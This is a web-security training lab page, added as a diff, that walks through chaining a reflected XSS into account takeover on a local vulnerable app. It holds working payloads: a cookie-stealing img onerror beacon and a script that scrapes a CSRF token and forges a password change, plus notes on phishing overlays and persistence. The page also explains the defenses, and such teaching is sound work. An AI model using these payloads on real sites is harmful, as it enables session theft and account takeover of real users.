@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Module 15 — Attack Chaining → Account Takeover</title>
+<link rel="stylesheet" href="../assets/lab.css">
+<link rel="stylesheet" href="../module_15_chaining/module.css">
+</head>
+<body>
+<nav class="nav">
+  <a href="/">◂ Lab home</a>
+  <a href="../module_14_proto/">◂ Module 14</a>
+  <a href="../module_16_cases/">Module 16 ▸</a>
+</nav>
+
+<p class="kicker">Module 15 · impact</p>
+<h1>Attack Chaining — XSS → Full Account Takeover <span class="badge attack">attack</span></h1>
+<p class="lead">This is the module where <code>alert(1)</code> becomes real. XSS
+is an <em>entry point</em>; the impact is whatever the script does with the
+origin's trust. Here we chain it into taking over the account.</p>
+
+<h2>The mental shift: proof vs. impact</h2>
+<p>Every previous module ended at <code>alert(document.domain)</code> — proof that
+arbitrary JS runs in the origin. A defender must understand what an attacker does
+<em>next</em>, because that dictates which defenses actually reduce risk. Once JS
+runs same-origin it can:</p>
+<ul>
+<li>Read <code>document.cookie</code> → <strong>session theft</strong> (unless
+<code>HttpOnly</code>).</li>
+<li>Read any same-origin page → <strong>steal anti-CSRF tokens</strong>, secrets,
+personal data.</li>
+<li>Issue authenticated same-origin <code>fetch</code> requests → <strong>forge
+actions</strong> (change password/email, add an OAuth app, transfer funds).</li>
+<li>Draw a fake login overlay → <strong>credential phishing</strong> that looks
+100% legitimate because it <em>is</em> on the real origin.</li>
+</ul>
+
+<h2>The lab's takeover chain</h2>
+<p>Module 15 adds a mini account system (<code>vuln_auth.py</code>):
+<code>/auth/login</code>, <code>/auth/account</code> (holds a CSRF token), and
+<code>/auth/change-password</code> (CSRF-protected). It also exposes a
+same-origin reflected XSS at <code>/auth/xss-entry?html=</code> for the payload to
+run in.</p>
+
+<h3>Step 0 — become the victim</h3>
+<p><a href="http://localhost:5000/auth/login" target="_blank" rel="noopener">▶ /auth/login</a> (sets a non-HttpOnly session cookie), then check
+<a href="http://localhost:5000/auth/status" target="_blank" rel="noopener">/auth/status</a> — note <code>password: "hunter2"</code>.</p>
+
+<h3>Step 1 — session theft (why HttpOnly matters)</h3>
+<pre><code>&lt;img src=x onerror="new Image().src='/collect?d='+encodeURIComponent(document.cookie)"&gt;</code></pre>
+<p>If the cookie lacks <code>HttpOnly</code>, this beacons the session to your
+Module 11 collector, and the attacker can replay it to impersonate the victim.
+Re-login with <a href="http://localhost:5000/auth/login?httponly=1" target="_blank" rel="noopener">/auth/login?httponly=1</a> and the same payload leaks nothing —
+<code>document.cookie</code> is empty. So the attacker pivots to Step 2, which
+<em>HttpOnly does not stop.</em></p>
+
+<h3>Step 2 — CSRF-token theft + forged password change (the takeover)</h3>
+<p>This works <strong>even with HttpOnly</strong>, because the script runs
+same-origin: it reads the CSRF token off the account page and submits the
+protected form itself. Paste this whole payload into the reflected entry point:</p>
+<div class="payload">
+  <input id="chain" value="<img src=x onerror=&quot;fetch('/auth/account').then(r=>r.text()).then(t=>{var m=t.match(/csrf-token.\+content=.(\w+)/);var tok=m[1];fetch('/auth/change-password',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf='+tok+'&newpw=pwned_by_xss'}).then(()=>new Image().src='/collect?d=takeover_done')})&quot;>">
+  <button class="copy" data-copy="#chain">copy payload</button>
+</div>
+<p>Deliver it via the same-origin reflected sink:</p>
+<div class="payload">
+  <input id="u1" value="http://localhost:5000/auth/xss-entry?html=<the payload above>">
+  <button class="copy" data-copy="#u1">copy URL template</button>
+</div>
+<p><a href="http://localhost:5000/auth/xss-entry?html=%3Cimg%20src%3Dx%20onerror%3D%22fetch('%2Fauth%2Faccount').then(r%3D%3Er.text()).then(t%3D%3E%7Bvar%20m%3Dt.match(%2Fcsrf-token.%2Bcontent%3D.(%5Cw%2B)%2F)%3Bvar%20tok%3Dm%5B1%5D%3Bfetch('%2Fauth%2Fchange-password'%2C%7Bmethod%3A'POST'%2Cheaders%3A%7B'Content-Type'%3A'application%2Fx-www-form-urlencoded'%7D%2Cbody%3A'csrf%3D'%2Btok%2B'%26newpw%3Dpwned_by_xss'%7D).then(()%3D%3Enew%20Image().src%3D'%2Fcollect%3Fd%3Dtakeover_done')%7D)%22%3E" target="_blank" rel="noopener">▶ fire the full takeover chain</a></p>
+<p>Then re-check <a href="http://localhost:5000/auth/status" target="_blank" rel="noopener">/auth/status</a>: the password is now <code>pwned_by_xss</code>, and your
+<a href="http://localhost:5000/callbacks" target="_blank" rel="noopener">/callbacks</a> console shows <code>takeover_done</code>. The account is
+compromised — no cookie theft required.</p>
+
+<div class="card danger">
+<strong>The load-bearing insight.</strong> Anti-CSRF tokens defend against
+<em>cross-site</em> forgery — a token the attacker's site cannot read. XSS runs
+<em>same-origin</em>, so it reads the token trivially. <strong>XSS defeats CSRF
+defenses, and it defeats <code>SameSite</code> cookies too</strong> (the request
+is same-site). This is why "we have CSRF tokens" is not an answer to XSS, and why
+XSS sits near the top of impact rankings.</p>
+</div>
+
+<h2>Other links in the chain</h2>
+<table>
+<thead><tr><th>Technique</th><th>What it achieves</th></tr></thead>
+<tbody>
+<tr><td>Credential-overlay phishing</td><td>Render a pixel-perfect fake login <em>on the real origin</em>; the victim has no URL/cert cue that anything is wrong.</td></tr>
+<tr><td>Persistent foothold</td><td>Register a Service Worker / write to storage so the attacker's code re-runs on future visits, surviving the original injection.</td></tr>
+<tr><td>OAuth / API-key theft</td><td>Read tokens from storage or same-origin endpoints and add attacker-controlled apps.</td></tr>
+<tr><td>Worm propagation</td><td>A stored XSS that also posts itself (Module 16's Samy) spreads to every viewer.</td></tr>
+<tr><td>Internal pivot</td><td>Same-origin fetches to internal admin endpoints the victim can reach.</td></tr>
+</tbody>
+</table>
+
+<h2>The defense, precisely</h2>
+<div class="card safe">
+<ol>
+<li><strong>Prevent the XSS</strong> — everything downstream depends on it. This is
+why the course invests so heavily in mechanisms 1–5.</li>
+<li><strong><code>HttpOnly</code> cookies</strong> — removes the easy session-theft
+link (Step 1), forcing the attacker to on-page forgery.</li>
+<li><strong>Re-authentication for sensitive actions</strong> (require the current
+password / a WebAuthn step to change password/email) — breaks the silent
+forgery in Step 2.</li>
+<li><strong>CSP + Trusted Types</strong> — stop the script from running or from
+reaching sinks at all, so no link in the chain forms.</li>
+<li><strong>Bind sessions</strong> (token binding, short lifetimes,
+anomaly detection) to reduce replay value of any stolen cookie.</li>
+</ol>
+</div>
+
+<h2>Checkpoint</h2>
+<div class="card">
+<ol>
+<li>Explain precisely why an anti-CSRF token does not protect against XSS.</li>
+<li>What does <code>HttpOnly</code> stop, and what does it <em>not</em> stop in
+this chain?</li>
+<li>Which single control most reduces the impact of the change-password step, and
+why?</li>
+</ol>
+</div>
+
+<footer>
+Module 15 of 19 · <a href="../module_16_cases/">Next: Real-World Incidents ▸</a><br>
+Endpoints: <code>/auth/login</code>, <code>/auth/account</code>, <code>/auth/change-password</code>, <code>/auth/xss-entry</code>.
+</footer>
+<script src="../assets/lab.js"></script>
+</body>
+</html>
